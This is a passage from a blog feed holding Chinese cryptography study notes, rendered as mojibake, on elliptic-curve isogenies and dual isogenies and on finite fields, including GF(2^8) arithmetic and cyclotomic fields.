inseparable)</p><p><strong>æ€§è´¨</strong>:çº¯ä¸å¯åˆ†åŒæºçš„åº¦å¿…ç„¶æ˜¯$p^n$çš„å½¢å¼(åä¹‹,æœªå¿…æˆç«‹)ã€‚</p><p>$deg\phi=1$ (åŒæ„)æ—¶ï¼Œåˆ™$\phi$å…·æœ‰å¦‚ä¸‹æ€§è´¨ï¼š</p><ul><li>$\phi$æ˜¯å¯åˆ†çš„(å³$(\frac u(x){v(x)})^{\prime}\neq0)$</li><li>$\phi$ä¹Ÿæ˜¯çº¯ä¸å¯åˆ†çš„ (å³$deg_s\not\phi=1)$</li></ul><hr><h2 id="ä»£æ•°é—­åŒ…-algebraic-closure"><a href="#ä»£æ•°é—­åŒ…-algebraic-closure" class="headerlink" title="ä»£æ•°é—­åŒ…(algebraic closure)"></a>ä»£æ•°é—­åŒ…(algebraic closure)</h2><p>åŒæº $\phi{:}E(K)\to E^{\prime}(K)$è¯±å¯¼äº†ä¸€ä¸ª$E(\overline{K})\to E^{\prime}(\overline{K})$çš„ç¾¤åŒæ€ã€‚</p><blockquote><p>ä¾‹ï¼š$E(F_q)$ä¸Šçš„å¼—ç½—è´å°¼ä¹Œæ–¯è‡ªåŒæ€$\pi{:}\left(X{:}Y{:}Z\right)\mapsto\left(X^q{:}Y^q{:}Z^q\right)$,<br>è¯±å¯¼äº†ä¸€ä¸ª$E(\overline{F}_q)\to E^{\prime}(\overline{F}_q)$çš„ç¾¤åŒæ„ã€‚</p></blockquote><hr><h2 id="åŒæºæ ¸-isogeny-kernel"><a href="#åŒæºæ ¸-isogeny-kernel" class="headerlink" title="åŒæºæ ¸(isogeny kernel)"></a>åŒæºæ ¸(isogeny kernel)</h2><p>æœ¬è´¨ä¸Šæ˜¯åŒæºçš„åŒæ€æ ¸</p><h3 id="ç¬¬ä¸€åŒæºæ ¸å®šç†-First-isogeny-kernel-theorem"><a href="#ç¬¬ä¸€åŒæºæ ¸å®šç†-First-isogeny-kernel-theorem" class="headerlink" title="ç¬¬ä¸€åŒæºæ ¸å®šç†(First isogeny-kernel theorem)"></a>ç¬¬ä¸€åŒæºæ ¸å®šç†(First isogeny-kernel theorem)</h3><p><strong>å®šç†</strong>ï¼šåŒæº$\phi=\alpha$ o$(\pi^{\prime})^n$,åˆ™$|\ker\phi|=deg(\alpha)$<br>(åŒæºæ ¸çš„é˜¶ç­‰äºå…¶å¯åˆ†åº¦)</p><p>$|\mathrm{Ker~}\phi|=|\mathrm{Ker~}\alpha|=|S|=deg\left(g\right)=deg\left(\alpha\right)$</p><p>ä¾‹ï¼š$deg(\alpha)=3$,åˆ™$|\ker\phi|=3$</p><h3 id="ç¬¬äºŒåŒæºæ ¸å®šç†-Second-isogeny-kernel-theorem"><a href="#ç¬¬äºŒåŒæºæ ¸å®šç†-Second-isogeny-kernel-theorem" class="headerlink" title="ç¬¬äºŒåŒæºæ ¸å®šç†(Second isogeny-kernel theorem)"></a>ç¬¬äºŒåŒæºæ ¸å®šç†(Second isogeny-kernel theorem)</h3><p><strong>å®šç†</strong>ï¼šè®¾$E(K)$æ˜¯æ¤­åœ†æ›²çº¿ï¼Œ$G$æ˜¯$E(\bar{K})$çš„æœ‰é™å­ç¾¤ï¼Œåˆ™å­˜åœ¨æ¤­åœ†æ›²çº¿$E^\prime$,ä»¥åŠå¯åˆ†åŒæº$\phi:E\to E^{\prime}$,ä½¿å¾— $Ker \phi=G$,ä¸”$E^\prime$å’Œ$\phi$åœ¨åŒæ„æ„ä¹‰ä¸‹æ˜¯å”¯ä¸€çš„ã€‚</p><p><strong>æ¨è®º</strong>:åº¦æ˜¯åˆæ•°çš„åŒæºå¯ä»¥è¢«åˆ†è§£æˆä¸€ç³»åˆ—åº¦æ˜¯ç´ æ•°çš„åŒæºã€‚</p><h2 id="æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯"><a href="#æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯" class="headerlink" title="æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯"></a>æ¤­åœ†æ›²çº¿çš„è‡ªåŒæ€ç¯</h2><h3 id="åŒæ€ç¾¤-groups-of-homomorphisms"><a href="#åŒæ€ç¾¤-groups-of-homomorphisms" class="headerlink" title="åŒæ€ç¾¤(groups of homomorphisms)"></a>åŒæ€ç¾¤(groups of homomorphisms)</h3><p>è®¾æ¤­åœ†æ›²çº¿$E$å’Œ$E^{\prime}$å®šä¹‰åœ¨åŸŸ$K$ä¸Šï¼Œå®šä¹‰é›†åˆ</p><p>$Hom(E,E^{\prime}):=\{\text{æ‰€æœ‰åŒæº}\alpha{:}E\to E^{\prime}\}\cup\{[0]\}$</p><blockquote><p>$Hom(E,E^{\prime})$ä¸Šçš„åŠ æ³•è¿ç®—ï¼šå¯¹äºä»»æ„ $\alpha,\beta\in Hom(E,E^{\prime})$,ä»»æ„ç‚¹<br>$P\in E(\overline{K}),\alpha+\beta$å®šä¹‰ä¸º$(\alpha+\beta)(P):=\alpha(P)+\beta(P)$</p><p>æ„æˆåŠ æ³•é˜¿è´å°”ç¾¤ï¼ŒåŠ æ³•å•ä½å…ƒï¼š$[0]:P\mapsto 0P(=O)$</p></blockquote><p><strong>å¼•ç†1</strong></p><p>è®¾ $\alpha, \beta \in Hom(E,Eâ€™)$ï¼Œå¯¹äºæ‰€æœ‰ç‚¹ $P \in E(\overline{K})$ï¼Œå¦‚æœ $\alpha(P) = \beta(P)$ï¼Œåˆ™ $\alpha = \beta$</p><p><strong>å¼•ç†2</strong></p><p>å¯¹äºæ‰€æœ‰ $n \in Z$ å’Œ $\alpha \in Hom(E,Eâ€™)$ï¼Œæœ‰ $[n] \circ \alpha = n\alpha = \alpha \circ [n].$</p><h4 id="åˆ†é…å¾‹"><a href="#åˆ†é…å¾‹" class="headerlink" title="åˆ†é…å¾‹"></a>åˆ†é…å¾‹</h4><p>å¯¹äº$\alpha,\beta\in Ho\boldsymbol{m}(E,E^{\prime}),\phi\in Ho\boldsymbol{m}(E^{\prime},E^{\prime\prime})$,æœ‰<br>$\phi\circ(\alpha+\beta)=\phi\circ\alpha+\phi\circ\beta$</p><p>å¯¹äº$\phi\in Ho\boldsymbol{m}(E,E^{\prime}),\boldsymbol{\alpha},\beta\in H\boldsymbol{om}(E^{\prime},E^{\prime\prime})$,æœ‰<br>$(\alpha+\beta)\circ\phi=\alpha\circ\phi+\beta\circ\phi$</p><h4 id="æ¶ˆå»å¾‹"><a href="#æ¶ˆå»å¾‹" class="headerlink" title="æ¶ˆå»å¾‹"></a>æ¶ˆå»å¾‹</h4><p>æ¶ˆå»å¾‹ï¼šè®¾ $\boldsymbol{\alpha},\boldsymbol{\beta}{:}E\to E^{\prime},\boldsymbol{\phi}{:}E^{\prime}\to E^{\prime\prime}$æ˜¯åŒæºï¼Œæœ‰</p><script type="math/tex; mode=display">\phi\circ\alpha=\phi\circ\beta\quad\Longrightarrow\quad\alpha=\beta</script><p>è®¾ $\phi{:}E\longrightarrow E^{\prime},\boldsymbol{\alpha},\boldsymbol{\beta}{:}E^{\prime}\to E^{\prime\prime}$æ˜¯åŒæºï¼Œæœ‰</p><script type="math/tex; mode=display">\alpha\circ\phi=\beta\circ\phi\Rightarrow\alpha=\beta</script><h3 id="å¯¹å¶åŒæº"><a href="#å¯¹å¶åŒæº" class="headerlink" title="å¯¹å¶åŒæº"></a>å¯¹å¶åŒæº</h3><p><strong>å®šä¹‰(å¯¹å¶åŒæº):</strong> </p><p>è®¾åŒæº $\phi:E \rightarrow Eâ€™$ , å…¶åº¦ä¸º $deg(\phi)$ , åˆ™ $\phi$ å”¯ä¸€çš„å¯¹å¶åŒæºä¸º $\widehat{\phi}$ , æ»¡è¶³ </p><p>$\widehat{\phi} \circ \phi = [deg(\phi)]$ </p><blockquote><p>$\text{å¦å¤–,å®šä¹‰}[\widehat0]:=[0]$</p></blockquote><p>ä¾‹: è®¾ $deg(\phi) = 3$, åˆ™ $\widehat{\phi} \circ \phi = [deg(\phi)] = [3]$, å³ å¯¹äºä»»æ„ç‚¹ $P \in E$, æœ‰ <script type="math/tex">\widehat{\phi} \circ \phi(P) = \widehat{\phi}(\phi(P)) = [3](P) = 3P</script></p><p><strong>æ€§è´¨1</strong>ï¼šå¦‚æœ $\widehat{\phi} \circ \phi = [\deg(\phi)]$ï¼Œé‚£ä¹ˆ $\phi \circ \widehat{\phi} = [\deg(\phi)]$ï¼Œä¹Ÿå³ <script type="math/tex">\widehat{\widehat{\phi}} = \phi</script> </p><p>è¯æ˜ï¼š$(\phi \circ \widehat{\phi}) \circ \phi = \phi \circ (\widehat{\phi} \circ \phi)$ ï¼ˆç»“åˆå¾‹ï¼‰ </p><p>$= \phi \circ [\deg(\phi)]$ ï¼ˆå¯¹å¶åŒæºå®šä¹‰ï¼‰ </p><p>$= [\deg(\phi)] \circ \phi$ ï¼ˆã€ŠåŒæ€ç¾¤ã€‹å¼•ç†2ï¼‰ </p><p>åˆ™ $\phi \circ \widehat{\phi} = [\deg(\phi)]$ ï¼ˆæ¶ˆå»å¾‹ï¼‰</p><p><strong>æ€§è´¨2</strong>ï¼šå¯¹äºä»»æ„ $n\in\mathbb{Z}$,æœ‰$[\widehat n]=[n]$<br>è¯æ˜ï¼š</p><script type="math/tex; mode=display">\begin{aligned}[n]\circ[n]&=[n^2]\\&=[deg([n])]\end{aligned}</script><p><strong>æ€§è´¨3</strong>ï¼šå¯¹äºä»»æ„ $\alpha, \beta \in Hom(E,Eâ€™)$ï¼Œæœ‰ $\widehat{\alpha + \beta} = \widehat{\alpha} + \widehat{\beta}$</p><p><strong>æ€§è´¨4</strong>ï¼šå¯¹äºä»»æ„$\alpha\in Hom(E^{\prime},E^{\prime\prime}),\beta\in Hom(E,E^{\prime})$,æœ‰</p><script type="math/tex; mode=display">\widehat{\alpha\circ\beta}=\widehat{\beta}\circ\widehat{\alpha}</script><blockquote><p>$\alpha\circ\beta$ç›¸å½“äº$\phi$<br>$\widehat{\beta}\circ\widehat{\alpha}$ç›¸å½“äº$\widehat{\phi}$<br>$[deg(\alpha\circ\beta)]$ç›¸å½“äº$[deg(\phi)]$</p></blockquote><h1 id="æœªå®Œå¾…ç»­â€¦â€¦"><a href="#æœªå®Œå¾…ç»­â€¦â€¦" class="headerlink" title="æœªå®Œå¾…ç»­â€¦â€¦"></a>æœªå®Œå¾…ç»­â€¦â€¦</h1>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
            <tag> æ¤­åœ†æ›²çº¿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç­‘åŸºç¯‡Â·æŠ½è±¡ä»£æ•°Â·æœ‰é™åŸŸ</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰"><a href="#å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰" class="headerlink" title="å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰"></a>å¯†ç å­¦å­¦ä¹ ç¬”è®°â€”â€”ç­‘åŸºç¯‡Â·å·å››ï¼ˆæœ‰é™åŸŸï¼‰</h2><hr><h1 id="æœ‰é™åŸŸ"><a href="#æœ‰é™åŸŸ" class="headerlink" title="æœ‰é™åŸŸ"></a>æœ‰é™åŸŸ</h1><hr><h2 id="æœ‰é™åŸŸ-ä¼½ç½—ç“¦åŸŸ"><a href="#æœ‰é™åŸŸ-ä¼½ç½—ç“¦åŸŸ" class="headerlink" title="æœ‰é™åŸŸ(ä¼½ç½—ç“¦åŸŸ)"></a>æœ‰é™åŸŸ(ä¼½ç½—ç“¦åŸŸ)</h2><blockquote><p><strong>æ¦‚å¿µå›é¡¾</strong>:</p><ul><li><p><strong>æœ‰é™åŸŸ</strong>ï¼šå…ƒç´ ä¸ªæ•°(é˜¶)æœ‰é™çš„åŸŸã€‚</p></li><li><p><strong>ç‰¹å¾</strong>ï¼š$ma=\theta$ ($\forall a\in R)$çš„æœ€å°æ­£æ•´æ•°$m;$ å¦åˆ™ $m=0$ã€‚å³ Char $R=m$<br>$(me=\theta\left(e\in R\right)$çš„æœ€å°æ­£æ•´æ•°$m;$ å¦åˆ™ $m=0)$</p><p><strong>æœ‰é™åŸŸçš„ç‰¹å¾ä¸€å®šæ˜¯ç´ æ•°</strong></p></li><li><p><strong>ç´ åŸŸ</strong>ï¼šä¸åŒ…å«ä»»ä½•çœŸå­åŸŸçš„åŸŸ (ä»»ä½•çœŸå­é›†éƒ½ä¸ä¼šæ„æˆå…¶å­åŸŸ)</p></li></ul></blockquote><p>ä»ä¸‹é¢å¼€å§‹ï¼Œè‹¥æ— ç‰¹æ®Šè¯´æ˜$p$ä¸ºç´ æ•°ï¼Œ$F$ä¸ºæœ‰é™åŸŸã€‚</p><p><strong>å®šç†1</strong>:é˜¶ä¸ºç´ æ•°çš„æœ‰é™åŸŸå¿…æ˜¯ç´ åŸŸï¼Œå…¶ç‰¹å¾æ˜¯è¿™ä¸ªç´ æ•°</p><p><strong>å®šç†2</strong>:ä»»ä½•æœ‰é™åŸŸéƒ½åŒ…å«ä¸€ä¸ªåŒæ„äº$Z_p$çš„å­åŸŸ</p><p>å¼•ç†:$Kæ˜¯Fçš„å­åŸŸ,\quad|K|=q,\quad[F{:}K]=n,\quadåˆ™|F|=q^n$</p><p><strong>å®šç†2</strong>: $Fçš„ç‰¹å¾æ˜¯p,Kæ˜¯Fçš„ç´ å­åŸŸ,[F;K]=n, åˆ™ |F|=p^n$</p><hr><h2 id="æœ‰é™åŸŸçš„å”¯ä¸€æ€§"><a href="#æœ‰é™åŸŸçš„å”¯ä¸€æ€§" class="headerlink" title="æœ‰é™åŸŸçš„å”¯ä¸€æ€§"></a>æœ‰é™åŸŸçš„å”¯ä¸€æ€§</h2><p><strong>å®šç†</strong> (æœ‰é™åŸŸçš„å”¯ä¸€æ€§):å¯¹äºä»»æ„ç´ æ•°$p$,ä»»æ„æ­£æ•´æ•°$n$,éƒ½å­˜åœ¨é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸã€‚ä»»ä½•é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸéƒ½åŒæ„äº$x^{p^n}-x$åœ¨$Z_p$ä¸Šçš„åˆ†è£‚åŸŸã€‚</p><p><strong>å¼•ç†</strong>ï¼š$F$çš„é˜¶ä¸º$q$,$K$æ˜¯$F$çš„å­åŸŸï¼Œ$\forall a\in F$,åˆ™</p><p>(1) $a^q=a$</p><p>$(2)x^q-x\in K[X]$åœ¨$K$ä¸Šçš„åˆ†è£‚åŸŸä¸º$F$,ä¸” $x^q-x=\prod_{a\in F}(x-a)$</p><p><strong>ç»“è®º</strong>:å…·æœ‰ç›¸åŒå…ƒç´ çš„æœ‰é™åŸŸéƒ½æ˜¯åŒæ„çš„<br>é˜¶ä¸ºqçš„æœ‰é™åŸŸï¼Œç»Ÿä¸€ç”¨<strong>F</strong>è¡¨ç¤º(æœ‰çš„ä¹¦é‡Œç”¨<strong>GF(q)</strong>è¡¨ç¤º)</p><hr><h2 id="æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹"><a href="#æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹" class="headerlink" title="æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹"></a>æœ‰é™åŸŸçš„ç»“æ„ç‰¹ç‚¹</h2><ul><li><p>æœ‰é™åŸŸ$\Longrightarrow$é˜¶ä¸º$p^n$</p><p>ä»»æ„ç´ æ•°$p$,ä»»æ„æ­£æ•´æ•°$n\Rightarrow$å­˜åœ¨é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸ</p></li><li><p>é˜¶ä¸º$p^n$çš„æœ‰é™åŸŸï¼Œç‰¹å¾ä¸º$p$,åŒ…å«é˜¶ä¸º$p$çš„ç´ å­åŸŸ</p><p>$n$æ˜¯å…¶åœ¨è¯¥ç´ å­åŸŸä¸Šçš„æ‰©å¼ ç»´åº¦</p></li></ul><hr><h2 id="å­åŸŸå‡†åˆ™-subfield-criterion"><a href="#å­åŸŸå‡†åˆ™-subfield-criterion" class="headerlink" title="å­åŸŸå‡†åˆ™ (subfield criterion)"></a>å­åŸŸå‡†åˆ™ (subfield criterion)</h2><p><strong>å®šç† (å­åŸŸå‡†åˆ™)</strong>:è®¾$q=p^n$,<strong>æœ‰é™åŸŸ</strong>$F_q$<strong>æ¯ä¸ªå­åŸŸçš„é˜¶éƒ½å…·æœ‰</strong>$p^m$çš„<strong>å½¢å¼</strong>ï¼Œ<br>å…¶ä¸­$m$æ˜¯$n$çš„<strong>æ­£å› å­</strong>ã€‚åä¹‹ï¼Œå¦‚æœ$m$æ˜¯$n$çš„<strong>æ­£å› å­</strong>ï¼Œå¿…ç„¶å­˜åœ¨$F_q$çš„å”¯ä¸€å­åŸŸï¼Œå…¶é˜¶ä¸º$p^m$ã€‚</p><blockquote><p>ä¾‹ï¼šä¾‹ï¼šæ±‚æœ‰é™åŸŸ$F_{2^{30}}$çš„æ‰€æœ‰å­åŸŸ</p><p>è§£ï¼š30çš„æ­£å› å­æœ‰1ï¼Œ2,3,5,6,10,15,30,åˆ™<br>æ‰€æ±‚å­åŸŸä¸º$F_2,F_{2^2},F_{2^3},F_{2^5},F_{2^6},F_{2^{10}},F_{2^{15}},F_{2^{30}}$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240820085851977.png" alt="image-20240820085851977"></p></blockquote><hr><h2 id="æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤"><a href="#æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤" class="headerlink" title="æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤"></a>æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤</h2><p>$F_q$:æœ‰é™åŸŸ(æœ‰$q$ä¸ªå…ƒç´ )<br>$F_q^*$:æœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤(ä¸åŒ…å«é›¶å…ƒï¼Œåªæœ‰$q-1$ä¸ªå…ƒç´ )</p><p><strong>å®šç†1</strong>ï¼šæœ‰é™åŸŸçš„ä¹˜æ³•ç¾¤æ˜¯<strong>å¾ªç¯ç¾¤</strong></p><h3 id="æœ¬åŸå…ƒ-primitive-element"><a href="#æœ¬åŸå…ƒ-primitive-element" class="headerlink" title="æœ¬åŸå…ƒ(primitive element)"></a>æœ¬åŸå…ƒ(primitive element)</h3><p><strong>å®šä¹‰ (æœ¬åŸå…ƒ)</strong>: æœ‰é™åŸŸ$F_q$ä¹˜æ³•ç¾¤çš„<strong>ç”Ÿæˆå…ƒ</strong>ç§°ä¸º$F_q$çš„<strong>æœ¬åŸå…ƒ.</strong></p><p>åŒºåˆ†æ¦‚å¿µï¼š</p><p>æœ¬åŸå…ƒï¼šæœ‰é™åŸŸä¹˜æ³•ç¾¤çš„ç”Ÿæˆå…ƒ<br>åŸæ ¹ï¼šæ¨¡è¿ç®—ä¸‹å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒ</p><p><strong>å®šç†2</strong>:$F_ræ˜¯F_qçš„æœ‰é™æ‰©å¼ ,åˆ™F_ræ˜¯F_qçš„å•ä»£æ•°æ‰©å¼ :å¯¹äºä»»æ„F_rçš„æœ¬åŸå…ƒa,éƒ½æœ‰F_r=F_q(a)ã€‚$</p><p><strong>æ¨è®º</strong>ï¼šå¯¹äºä»»æ„æœ‰é™åŸŸ$F_q$,ä»»æ„æ­£æ•´æ•°$n$,$F_q[X]$é‡Œéƒ½æœ‰ä¸€ä¸ªåº¦ä¸º$n$çš„ä¸å¯çº¦å¤šé¡¹å¼ã€‚</p><hr><h2 id="æ„é€ æœ‰é™åŸŸ"><a href="#æ„é€ æœ‰é™åŸŸ" class="headerlink" title="æ„é€ æœ‰é™åŸŸ"></a>æ„é€ æœ‰é™åŸŸ</h2><p>$F_q\rightarrow F_{q^n}$</p><p>åŸºäºâ€œä¸å¯çº¦å¤šé¡¹å¼â€æ„é€ æœ‰é™åŸŸï¼š$F_q[X]/(f(x))$<br>åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸï¼š$F_q(a),f(a)=0$</p><script type="math/tex; mode=display">F_{q^n}\colon F_q[X]/(f(x))\cong F_q(a)</script><h3 id="åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ"></a>åŸºäºä¸å¯çº¦å¤šé¡¹å¼æ„é€ æœ‰é™åŸŸ</h3><p>$f(x)\in F_q[X]$æ˜¯ä¸å¯çº¦å¤šé¡¹å¼ï¼Œåˆ™ $F_q[X]/(f(x))$æ˜¯æœ‰é™åŸŸ<br>$deg(f(x))=n$,åˆ™$F_q<a href="f(x">X</a>)=F_q^n$</p><blockquote><p>ä¾‹å­:$F_{2^{8}}=\{r(x)|r(x)\in F_2[X],deg(r(x))&lt;8\}$</p><p>$r(x)=a_7x^7+\cdots+a_1x+a_0$</p><script type="math/tex; mode=display">r(x){:}0x^{7}+\cdots+0x+0\longrightarrow00\\x^{7}+\cdots+0x+0\longrightarrow01\\\cdots\\x^{7}+\cdots+x+1\longrightarrow FF</script><p>å¤šé¡¹å¼ï¼š$x^6+x^4+x^2+x+1$<br>äºŒè¿›åˆ¶ï¼š01010111</p><p>åå…­è¿›åˆ¶ï¼š57<br>åå…­è¿›åˆ¶ï¼š57+83=D4(äºŒè¿›åˆ¶å¯¹åº”æ¯”ç‰¹å¼‚æˆ–)<br>å¤šé¡¹å¼ï¼š$(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+x^4+x^2$(äºŒè¿›åˆ¶ï¼š11010100åå…­è¿›åˆ¶ï¼š$D4$)</p><p>åå…­è¿›åˆ¶ï¼š57Ã—83<br>å¤šé¡¹å¼ï¼š$(x^6+x^4+x^2+x+1)\times(x^7+x+1)$ mod $f(x)$<br>å¤šé¡¹å¼çš„æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</p></blockquote><script type="math/tex; mode=display">r_1(x),r_2(x)\in F_{q^n}</script><p>åŠ æ³•ï¼š$r_1(x)+r_2(x)$(ä¸éœ€è¦ $f(x)$å‚ä¸)<br>ä¹˜æ³•ï¼š$r_1(x)r_2(x)$ mod $f(x)$ (æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•)</p><h3 id="åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ"><a href="#åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ" class="headerlink" title="åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ"></a>åŸºäºâ€œåŸºâ€æ„é€ æœ‰é™åŸŸ</h3><p>1.$ æ‰¾$F_q[X]$é‡Œçš„ä¸å¯çº¦å¤šé¡¹å¼$f(x)$</p><p>2.$ ç®—å‡º$f(x)$çš„ä¸€ä¸ªæ ¹ï¼Œè®¾ä¸º$a$,å³$f(a)=\theta$ã€‚</p><p>æ‰©åŸŸå°±æ˜¯å•ä»£æ•°æ‰©å¼ $F_q(a)$</p><ol><li><p>è®¾$deg(f(x))=n$,åˆ™$F_q(a)$çš„åŸºä¸ºï¼š$e,a,â€¦,a^n-1$</p></li><li><p>$F_q(a)$å…ƒç´ ï¼š$b_0+ b_1a+ \cdots + b_{n- 1}a^{n- 1}$ $( F_q( a) = F_{q^n})$</p><p>$b_iæ˜¯F_qé‡Œçš„å…ƒç´ $</p></li></ol><blockquote><p>ä¾‹ï¼š$f(x)=x^{8}+x^{4}+x^{3}+x+1$</p><p>$f(a)=a^{8}+a^{4}+a^{3}+a^{4}+4$</p><p>$F_{2^{8}}=\{b_{0}+b_{1}a+\cdots+b_{7}a^{7}|b_{i}\in F_{2}\}$</p><p>åå…­è¿›åˆ¶:57<br>äºŒè¿›åˆ¶:01010111<br>å…ƒç´ :$a^6+a^4+a^2+a+1 $</p><p>$57+83=D4\colon\left(a^6+a^4+a^2+a+1\right)+\left(a^7+a+1\right)=a^7+a^6+a^4+a^2$</p><script type="math/tex; mode=display">\begin{aligned}&57\times83\colon(a^6+a^4+a^2+a+1)\times(a^7+a+1)\\&=a^{13}+a^{11}+a^9+a^8+a^6+a^5+a^4+a^3+1\\&f(a)=a^3+a^4+a^3+a+1=0\text{,æœ‰}\\&a^8=-a^4-a^3-a-1=a^4+a^3+a+1\\&a^9=a^5+a^4+a^2+a\\&a^{11}=a^7+a^6+a^4+a^3\\&a^{13}=a^9+a^3+a^5+a^5\\&57\times83=C1:\left(a^6+a^4+a^2+a+1\right)\times\left(a^7+a+1\right)=a^7+a^6+1\end{aligned}</script></blockquote><hr><h2 id="åˆ†åœ†åŸŸ-cyclotomic-field"><a href="#åˆ†åœ†åŸŸ-cyclotomic-field" class="headerlink" title="åˆ†åœ†åŸŸ(cyclotomic field)"></a>åˆ†åœ†åŸŸ(cyclotomic field)</h2><p>$næ˜¯æ­£æ•´æ•°ï¼ŒKæ˜¯ä»»æ„åŸŸï¼Œf(x)=x^n-e\in K[x]$</p><script type="math/tex; mode=display">f(x)=x^n-e=(x-b_1)...(x-b_n)</script><script type="math/tex; mode=display">1\leq i\leq n,\:f(b_i)=b_i^n-e=(x-b_1)\:...(b_i-b_i)\:...(x-b_n)=\theta</script><p>$b_i$ æ˜¯$x^n-e$çš„æ ¹ã€‚</p><p>$x^n-e$åœ¨$K$ä¸Šçš„åˆ†è£‚åŸŸä¸º$K(b_1,â€¦,b_n)$</p><p><strong>å®šä¹‰(åˆ†åœ†åŸŸ)</strong>:$n$æ˜¯æ­£æ•´æ•°ï¼Œ$K$æ˜¯ä»»æ„åŸŸï¼Œ$x^n-e$åœ¨$K$ä¸Šçš„åˆ†<br>è£‚åŸŸç§°ä¸º$K$ä¸Š$n$æ¬¡åˆ†åœ†åŸŸï¼Œè®°ä¸º$K^{(n)}$ã€‚</p><script type="math/tex; mode=display">1\leq i\leq n, f(b_i)=b_i^n-e=(x-b_1) ...(b_i-b_i) ...(x-b_n)=\theta\\\text{æœ‰ }b_i^n=e\text{,å³ }b_1,...,b_n\text{éƒ½æ˜¯}e\text{çš„}n\text{æ¬¡æ ¹ã€‚}\\\text{å®šä¹‰}(n\text{æ¬¡å•ä½æ ¹})\text{:}x^n-e\text{åœ¨}K^{(n)}\text{é‡Œçš„æ ¹}(\text{å³ }b_1,...,b_n)\text{ç§°ä¸º}\\K\text{ä¸Š}n\text{æ¬¡å•ä½æ ¹}(n\text{th roots of unity})\text{ã€‚}</script><p>$E^{(n)}$:$x^n-e$åœ¨$K^{(n)}$é‡Œçš„æ ¹ç»„æˆçš„é›†åˆï¼Œè®°ä¸º$E^{(n)}$<br>$E^{(n)}$çš„ç»“æ„ä¾èµ–äº$n$å’Œ$K$çš„ç‰¹å¾$m$ã€‚</p><p><strong>å®šç†1</strong>ï¼š$K$çš„ç‰¹å¾$m$ä¸æ˜¯$n$çš„å› å­ï¼Œåˆ™$E^{(n)}$æ˜¯<strong>ä¹˜æ³•å¾ªç¯ç¾¤ï¼Œé˜¶</strong>ä¸º$n$ã€‚</p><p><strong>å®šä¹‰$(n$æ¬¡æœ¬åŸå•ä½æ ¹)</strong>:$E^(n)$æ˜¯ä¹˜æ³•å¾ªç¯ç¾¤æ—¶ (å³$m$ä¸æ˜¯$n$çš„å› å­),<br>$E^{(n)}$çš„ç”Ÿæˆå…ƒç§°ä¸º$K$ä¸Š$n$<strong>æ¬¡æœ¬åŸå•ä½æ ¹(primitive $n$th root of</strong><br><strong>unity)ã€‚</strong></p><p><strong>æ¦‚å¿µåŒºåˆ†</strong>ï¼š</p><ul><li>æœ¬åŸå…ƒï¼šæœ‰é™åŸŸä¹˜æ³•ç¾¤çš„ç”Ÿæˆå…ƒ</li><li>åŸæ ¹ï¼šæ¨¡è¿ç®—ä¸‹å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒ</li><li>$n$æ¬¡æœ¬åŸå•ä½æ ¹ï¼šä¹˜æ³•å¾ªç¯ç¾¤ $E^{(n)}$çš„ç”Ÿæˆå…ƒ</li></ul><blockquote><p>ä¾‹ï¼š$n$æ¬¡åˆ†åœ†åŸŸ$\mathbb{Q}^(n)$æ˜¯$x^n-1$åœ¨Qä¸Šçš„åˆ†è£‚åŸŸ</p><p>$\mathbb{Q}^{(n)}$æ˜¯å¤æ•°åŸŸçš„å­åŸŸã€‚</p><p><img 